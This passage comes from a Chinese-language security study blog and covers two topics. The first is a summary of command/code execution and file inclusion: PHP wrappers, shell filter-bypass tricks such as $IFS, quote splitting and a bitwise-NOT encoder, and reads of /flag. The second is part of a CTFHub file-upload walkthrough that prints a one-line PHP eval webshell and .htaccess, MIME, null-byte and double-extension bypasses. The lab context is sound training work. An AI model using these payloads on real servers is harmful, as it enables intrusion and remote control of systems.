file2。</li><li>‌<strong>mv</strong>‌：移动或重命名文件或目录。例如，mv old_name new_name 重命名文件。</li><li>‌<strong>du</strong>‌：统计文件和目录的磁盘使用情况。</li></ul><p><strong>2、查看文件内容</strong></p><ul><li>‌<strong>cat</strong>‌：连接文件并打印到标准输出。例如，cat file1 查看 file1 的内容。</li><li>‌<strong>tac</strong>‌：反向显示文件内容。</li><li>‌<strong>more</strong>‌：分页显示文件内容。</li><li>‌<strong>less</strong>‌：类似 more，但允许向前和向后滚动。</li><li>‌<strong>head</strong>‌：显示文件的前几行。例如，head -n 10 file1 显示 file1 的前10行。</li><li>‌<strong>tail</strong>‌：显示文件的最后几行或实时跟踪文件更新。例如，tail -f &#x2F;var&#x2F;log&#x2F;syslog 实时查看日志文件。</li></ul><p><strong>3、系统管理和网络</strong></p><ul><li>‌<strong>shutdown</strong>‌：关闭系统。例如，shutdown -h now 立即关机。</li><li>‌<strong>reboot</strong>‌：重启系统。</li><li>‌<strong>date</strong>‌：显示或设置系统日期和时间。</li><li>‌<strong>ping</strong>‌：测试网络连通性。例如，ping google.com 测试与 Google 的网络连接。</li></ul><p><strong>4、用户和权限管理</strong></p><ul><li>‌<strong>useradd</strong>‌：添加新用户。</li><li>‌<strong>userdel</strong>‌：删除用户。</li><li>‌<strong>groupadd</strong>‌：添加新组。</li><li>‌<strong>groupdel</strong>‌：删除组。</li><li>‌<strong>chown</strong>‌：更改文件或目录的属主和属组。例如，chown user:group file1 将 file1 的属主更改为 user，属组更改为 group。</li><li>‌<strong>chmod</strong>‌：更改文件或目录的权限。例如，chmod 755 file1 设置 file1 的权限为755。</li></ul><p><strong>5、压缩与解压缩</strong></p><ul><li>‌<strong>tar</strong>‌：归档文件。例如，tar -czvf archive.tar.gz dir1 将 dir1 压缩为 archive.tar.gz。</li><li>‌<strong>gzip</strong>‌：压缩文件。例如，gzip file1 将 file1 压缩为 file1.gz。</li><li>‌<strong>gunzip</strong>‌：解压缩 .gz 文件。</li><li>‌<strong>zip</strong>‌：压缩文件或目录为 .zip 格式。</li><li>‌<strong>unzip</strong>‌：解压缩 .zip 文件。</li></ul><p><strong>6、其他常用命令</strong></p><ul><li>‌<strong>find</strong>‌：在文件系统中查找文件或目录。例如，find &#x2F; -name file1 从根目录开始查找名为 file1 的文件。</li><li>‌<strong>grep</strong>‌：在文件中搜索文本。例如，grep “hello” file1 在 file1 中搜索包含 “hello” 的行。</li><li>‌<strong>ps</strong>‌：显示当前运行的进程。例如，ps aux 显示所有进程。</li><li>‌<strong>kill</strong>‌：终止进程。例如，kill -9 PID 强制终止进程 PID。</li></ul><p>更多请看：<a href="https://blog.csdn.net/wer24_25/article/details/141940310" title="Linux常见指令(超全超详细)_linux指令-CSDN博客">Linux常见指令(超全超详细)_linux指令-CSDN博客</a></p><h3 id="常见命令连接符"><a href="#常见命令连接符" class="headerlink" title="常见命令连接符"></a>常见命令连接符</h3><p>一、<strong>Windows</strong></p><p><code>|</code>：直接执行后面的语句：</p><p><code>||</code>：如果前面的语句执行出错，则执行后面的语句，否则仅执行前面的语句</p><p><code>&amp;</code>：前后的语句均可执行，但是前面的语句如果执行结果为假（即执行失败），则仅输出后面语句的结果</p><p><code>&amp;&amp;</code>：如果前面的语句为假，则直接报错，也不执行后面的语句。</p><p><code>&gt; 和 &gt;&gt;</code>：输出重定向命令。&gt; 清除文件中原有的内容后再写入；&gt;&gt; 追加内容到文件末尾，而不会清除原有的内容。主要将本来显示在屏幕上的内容输出到指定文件中；指定文件如果不存在，则自动生成该文件</p><p><code>&lt;</code>：从文件中获得输入信息，而不是从屏幕上，一般用于 date time label 等需要等待输入的命令</p><p><code>%0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %\*</code>：命令行传递给批处理的参数</p><ul><li><p><code>%0</code> 批处理文件本身</p></li><li><p><code>%1</code> 第一个参数</p></li><li><p><code>%9 </code>第九个参数</p></li><li><p><code>%*</code> 从第一个参数开始的所有参数</p></li></ul><p>具体请看：<a href="https://blog.csdn.net/2401_84229613/article/details/140844132" title="windows终端cmd命令和连接符等_cmd 连接符-CSDN博客">windows终端cmd命令和连接符等_cmd 连接符-CSDN博客</a></p><p>二、<strong>Linux</strong></p><p><code>;</code>：按顺序执行语句</p><p><code>|</code>：前面的命令与后面的命令都会执行，但是只显示后面命令的执行结果</p><p><code>||</code>：如果前面的语句执行失败，则执行后面的语句。如果前面的语句执行成功，则不执行后面的语句。</p><p><code>&amp;</code>：如果前面的语句为假（执行失败），则执行后面的语句，否则两条语句均会执行</p><p><code>&amp;&amp;</code>：如果前面的语句出错，则停止，否则两条语句均会执行</p><p>更多请见：<a href="https://www.kdun.com/ask/147475.html" title="linux命令分隔符有哪些 - 酷盾">linux命令分隔符有哪些 - 酷盾</a></p><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p><strong>一、定义及原理</strong></p><p>远程代码执行，顾名思义就是用户可以远程执行代码。</p><p>这个漏洞和命令执行漏洞相近，根据设计的需求，需将用户输入的部分代码进行执行，又或者服务器对危险函数过滤不严导致用户输入的一些字符串可以被转换成代码来执行。这些时候往往容易导致远程代码执行。</p><p><strong>二、成因</strong></p><ul><li>用户能够控制函数输入</li><li>存在可执行代码的危险函数常见代码执行函数  <ul><li>PHP: eval、assert、preg_replace()、+&#x2F;e模式（PHP版本&lt;5.5.0）</li><li>Javascript: eval</li><li>Vbscript：Execute、Eval</li><li>Python: exec</li></ul></li></ul><p><strong>三、漏洞检测</strong></p><p>整体的检测方式和命令执行都是一样的，只是输入的方式不同。</p><h3 id="常见代码执行函数"><a href="#常见代码执行函数" class="headerlink" title="常见代码执行函数"></a>常见代码执行函数</h3><p>我们这里对常见的PHP代码执行函数进行详解</p><p><strong><code>eval</code>函数</strong>：</p><p>  该函数会将字符串当作函数进行执行，但是需要传入一个完整的语句，同时必须以；分号结尾，也是最常见的函数。</p><p><strong><code>assert</code>函数</strong>：</p><p>  该函数是判断是否为字符串，如果是则当初代码进行执行，但是在php7.0.29之后的版本不支持动态调用。</p><p><strong><code>$&#123;&#125;</code>执行代码</strong>：</p><p>  该执行代码会将中间的php代码进行解析。</p><p><strong><code>array_map</code>函数</strong>：</p><p>  该函数是为数组的每个元素应用回调函数。</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><strong>一、定义及原理</strong></p><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是用户将一段能够控制的脚本或者代码输入文件里，并让服务端执行该文件。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p><strong>二、分类</strong></p><p>文件包含漏洞主要包含两个方面，即本地文件包含漏洞(Local File Inclusion)和远程文件包含漏洞(Remote File Inclusion)。其中本地文件包含漏洞（LFI）有时也叫做目录遍历漏洞、任意文件访问漏洞。</p><p><strong>三、本地文件包含漏洞和远程文件包含漏洞的区别</strong></p><p>顾名思义，能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)；可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)。</p><p>区别就在与包含文件的位置不同，需要注意的是，include&#x2F;require函数加载远程文件时，allow_url_include、allow_url_fopen要求状态为ON，可以phpinfo进行查看。</p><h3 id="LFI漏洞利用"><a href="#LFI漏洞利用" class="headerlink" title="LFI漏洞利用"></a>LFI漏洞利用</h3><p>一、<strong>配合文件上传使用</strong></p><p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p><p>这种利用方式我们在学习文件上传时做upload-labs已经用过，详见作者的文章</p><p><strong>二、包含Apache日志文件</strong></p><p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p><p><strong>三、包含SESSION文件</strong></p><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p><p><strong>四、包含临时文件</strong></p><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p><p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p><h3 id="RFI漏洞利用"><a href="#RFI漏洞利用" class="headerlink" title="RFI漏洞利用"></a>RFI漏洞利用</h3><p>如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)。</p><p>RFI简单的利用可以看CTFHub技能树RCE中“远程包含“一题，简单来说就是在自己这里写一句话木马，然后让服务器端包含自己的一句话木马，从而可以控制服务器。</p><h3 id="常见的文件包含函数"><a href="#常见的文件包含函数" class="headerlink" title="常见的文件包含函数"></a>常见的文件包含函数</h3><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>include()</td><td>include 语句包含并运行指定文件</td></tr><tr><td>include_once()</td><td>只包含一次，不重复包含</td></tr><tr><td>require()</td><td>和include一样，不过出错时会停止</td></tr><tr><td>require_once()</td><td>和include_once一样</td></tr><tr><td>fopen()</td><td>打开文件或者 URL</td></tr><tr><td>readfile</td><td>读取文件并写入到输出缓冲</td></tr><tr><td>highlight_file</td><td>语法高亮一个文件</td></tr><tr><td>show_source</td><td>等于highlight_file()</td></tr><tr><td>file_get_contents</td><td>将整个文件读入一个字符串</td></tr><tr><td>file</td><td>把整个文件读入一个数组中</td></tr></tbody></table><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>PHP内置了很多URL风格的封装协议，除了常规的include&#x2F;require函数，我们也常常用这些PHP伪协议去实现文件包含漏洞。</p><p><strong>一、php:&#x2F;&#x2F;协议</strong></p><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input。</p><p>php:&#x2F;&#x2F;filter用于读取源码。</p><p>php:&#x2F;&#x2F;input用于执行php代码。</p><p>1、php:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, <strong>将post请求中的数据作为PHP代码执行</strong>。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p>利用条件:</p><p>    allow_url_fopen ：off&#x2F;on</p><p>    allow_url_include：on</p><p>2、php:&#x2F;&#x2F;filter 读取源代码，有时候需要base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p><p>利用条件:</p><p>    allow_url_fopen ：off&#x2F;on</p><p>    allow_url_include：off&#x2F;on</p><p>php:&#x2F;&#x2F;filter具有四个参数：</p><table><thead><tr><th>名称</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>resource &#x3D; &lt;要过滤的数据流&gt;</td><td>指定了你要筛选过滤的数据流。</td><td>必选</td></tr><tr><td>read &#x3D; &lt;读链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（    ）分隔。</td><td></td></tr><tr><td>write &#x3D; &lt;写链的筛选列表&gt;</td><td>可以设定一个或多个过滤器名称，以管道符（    ）分隔。</td><td></td></tr><tr><td>&lt;;两个链的筛选列表&gt;</td><td>任何没有以 read &#x3D; 或 write &#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table><p>举例，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/resource=/</span>flag<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/read=convert.base64-encode/resource=/flag<br></code></pre></td></tr></table></figure><p><strong>二、file:&#x2F;&#x2F;协议</strong></p><p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p><p><strong>三、ZIP:&#x2F;&#x2F;协议</strong></p><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p><p>  zip:&#x2F;&#x2F;中只能传入绝对路径。</p><p>    要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）</p><p>    只需要是zip的压缩包即可，后缀名可以任意更改。</p><p>    相同的类型还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;</p><p> 利用条件:</p><p>    allow_url_fopen ：off&#x2F;on</p><p>    allow_url_include：off&#x2F;on</p><p><strong>四、data:&#x2F;&#x2F;协议</strong></p><p>data:&#x2F;&#x2F; 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p><p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：</p><p>利用条件:</p><p>    allow_url_fopen ：on</p><p>    allow_url_include：on</p><p>我们总结一下上面的伪协议：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505041652429.png"></p><p>在PHP手册中还可以看到更多伪协议，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505041652134.png"></p><h2 id="混淆和绕过"><a href="#混淆和绕过" class="headerlink" title="混淆和绕过"></a>混淆和绕过</h2><h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h3><p><strong>cat替换命令:more、less、tac、head、tail、vi、vim、nl、od、sort、uniq。</strong></p><p>more：按页显示，用于文件内容较多且不能滚动屏幕时查看文件</p><p>less：与more类似</p><p>tac：与cat相反，按行反向输出</p><p>head：查看文件首几行</p><p>tail：查看文件末几行</p><p>nl：在cat查看文件的基础上显示行号</p><p>od：以二进制方式读文件，od -A d -c &#x2F;flag转人可读字符</p><p>xxd：以二进制方式读文件，同时有可读字符显示</p><p>sort：排序文件</p><p>uniq：报告或删除文件的重复行</p><p>file -f：报错文件内容</p><p>grep：过滤查找字符串，grep flag &#x2F;flag</p><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS、{cat,flag}等</p><p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><h3 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h3><p>用&amp;&amp;连接命令</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;cd flag_is_here&amp;&amp;cat flag.php<br></code></pre></td></tr></table></figure><p>采用多管道命令绕过</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>||cd flag_is_here;cat flag.php<br></code></pre></td></tr></table></figure><h3 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h3><p>URL编码绕过：%0a、%0d、%0D%0A</p><h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><p><strong>一、反斜杠\绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//如<span class="hljs-built_in">cat</span>、<span class="hljs-built_in">ls</span>被过滤，使用\绕过<br> <br>c\at /flag<br> <br>l\s /<br></code></pre></td></tr></table></figure><p><strong>二、引号绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//如<span class="hljs-built_in">cat</span>、<span class="hljs-built_in">ls</span>被过滤<br> <br>ca<span class="hljs-string">&quot;&quot;</span>t /flag<br> <br>l<span class="hljs-string">&#x27;s&#x27;</span> /<br></code></pre></td></tr></table></figure><p><strong>三、拼接法</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">a=<span class="hljs-built_in">fl</span>;b=ag;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure><p><strong>四、编码绕过</strong></p><p>1、Base64</p><p>2、8进制</p><p>3、16进制</p><p><strong>五、正则匹配绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">//如flag被过滤<br><span class="hljs-built_in">cat</span> /f???<br><span class="hljs-built_in">cat</span> /fl*<br><span class="hljs-built_in">cat</span> /f[a-z]&#123;3&#125;<br></code></pre></td></tr></table></figure><p><strong>六、取反绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//取反传参</span><br> <br><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system&quot;</span>;<br> <br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br> <br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br> <br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br> <br><span class="hljs-comment">//输出得到取反传参内容</span><br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;?cmd=(~&quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;)(~&quot;</span>.<span class="hljs-variable">$d</span>.<span class="hljs-string">&quot;);&quot;</span><br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/weixin_44268918/article/details/128386149" title="RCE代码及命令执行(详解)_rce命令执行-CSDN博客">RCE代码及命令执行(详解)_rce命令执行-CSDN博客</a></p><p><a href="https://www.cnblogs.com/networkroom/p/16395024.html" title="干货 | 命令执行漏洞和代码执行漏洞详解 - 网络安全自修室 - 博客园">干货 | 命令执行漏洞和代码执行漏洞详解 - 网络安全自修室 - 博客园</a></p><p><a href="https://blog.csdn.net/m0_73185293/article/details/131557169" title="RCE漏洞详解及绕过总结(全面)-CSDN博客">RCE漏洞详解及绕过总结(全面)-CSDN博客</a></p><p><a href="https://blog.csdn.net/HUANGXIN9898/article/details/140303233" title="命令执行(RCE)面对各种过滤，骚姿势绕过总结-CSDN博客">命令执行(RCE)面对各种过滤，骚姿势绕过总结-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_46467017/article/details/126380415" title="文件包含漏洞全面详解-CSDN博客">文件包含漏洞全面详解-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_58849785/article/details/137630067" title="文件包含漏洞详解（超级详细）-CSDN博客">文件包含漏洞详解（超级详细）-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传-CTFHub</title>
    <link href="/2025/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CTFHub/"/>
    <url>/2025/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145459083">https://blog.csdn.net/2302_81178149/article/details/145459083</a></p></blockquote><p> 在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p><strong>作者的CTFHub技能树汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5502" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><p>关于文件上传，作者认为upload-labs是一个很好的靶场。作者通过该靶场训练到了文件上传的大多数技巧。应对CTFHub这些题型时就已经得心应手，推荐大家也做一下。</p><p>upload-labs的wp：<a href="https://blog.csdn.net/2302_81178149/article/details/145442006" title="upload-labs通关全详解-CSDN博客">upload-labs通关全详解-CSDN博客</a></p><p>文件上传的技术总结：<a href="https://blog.csdn.net/2302_81178149/article/details/145433812" title="文件上传学习总结_文件上传学习 csdn-CSDN博客">文件上传学习总结_文件上传学习 csdn-CSDN博客</a></p><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>我们先写一个一句话木马文件webshell_post.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一会用来上传</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904098.png"></p><p>无验证就直接上传</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904939.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021909067.png"></p><p>告知上传路径</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904979.png"></p><p>用蚁剑连接，添加数据</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904368.png"></p><p>测试连接成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904659.png"></p><p>添加成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904388.png"></p><p>在html文件夹里发现flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904161.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904364.png"></p><h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>先上传试试，发现禁止上传</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904446.png"></p><p>果然是前端验证</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904330.png"></p><p>禁用js试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904392.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904468.png"></p><p>还是连接蚁剑</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904807.png"></p><p>Flag还在相同的位置</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904825.png"></p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>题目描述：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><p>将一句话木马webshell.php修改后缀名，改为webshell.jpg，制成图片马</p><p>然后上传</p><p>再制作一个.htaccess文件，写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Sethandler application/x-httpd-php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021909965.png"></p><p>然后上传</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021904920.png"></p><p>然后我们用蚁剑连接图片马</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021905119.png"> </p><p>找到flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021905538.png"></p><h2 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h2><p>上传一句话木马，用bp抓包</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">Content-<span class="hljs-keyword">Type</span>: application/octet-stream<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021905208.png"></p><p>补充一下常见的类型</p><table><thead><tr><th>类型</th><th>描述</th><th>典型示例</th></tr></thead><tbody><tr><td>text</td><td>表明文件是普通文本，理论上是人类可读</td><td>text&#x2F;plain, text&#x2F;html, text&#x2F;css, text&#x2F;javascript</td></tr><tr><td>image</td><td>表明是某种图像。不包括视频，但是动态图（比如动态 gif）也使用 image 类型</td><td>image&#x2F;gif, image&#x2F;png, image&#x2F;jpeg, image&#x2F;bmp, image&#x2F;webp, image&#x2F;x-icon, image&#x2F;vnd.microsoft.icon</td></tr><tr><td>audio</td><td>表明是某种音频文件</td><td>audio&#x2F;midi, audio&#x2F;mpeg, audio&#x2F;webm, audio&#x2F;ogg, audio&#x2F;wav</td></tr><tr><td>video</td><td>表明是某种视频文件</td><td>video&#x2F;webm, video&#x2F;ogg</td></tr><tr><td>application</td><td>表明是某种二进制数据</td><td>application&#x2F;octet-stream, application&#x2F;pkcs12, application&#x2F;vnd.mspowerpoint, application&#x2F;xhtml+xml, application&#x2F;xml, application&#x2F;pdf</td></tr></tbody></table><p>这里我们改成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">image/jpeg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021905909.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021905542.png"></p><p>蚁剑连接</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908510.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908688.png"></p><h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>还是上传之前制作的图片马，然后抓包</p><p>这里我们将上传路径修改，加上webshell.php%00</p><p>然后我们的文件就会保存在&#x2F;upload&#x2F;webshell.php，而不是原文件名webshell.jpg</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908318.png"></p><p>上传成功，但是没有显示上传路径，因为通过00截断我们已知上传路径，就是&#x2F;upload&#x2F;webshell.php</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908147.png"></p><p>用蚁剑连接</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908123.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908708.png"></p><h2 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h2><p>上传一句话木马，抓包</p><p>这里题目提示双写后缀，那我们就把filename改为webshell_post.pphphp</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908141.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908994.png"></p><p>用蚁剑连接，出flag</p><p><img 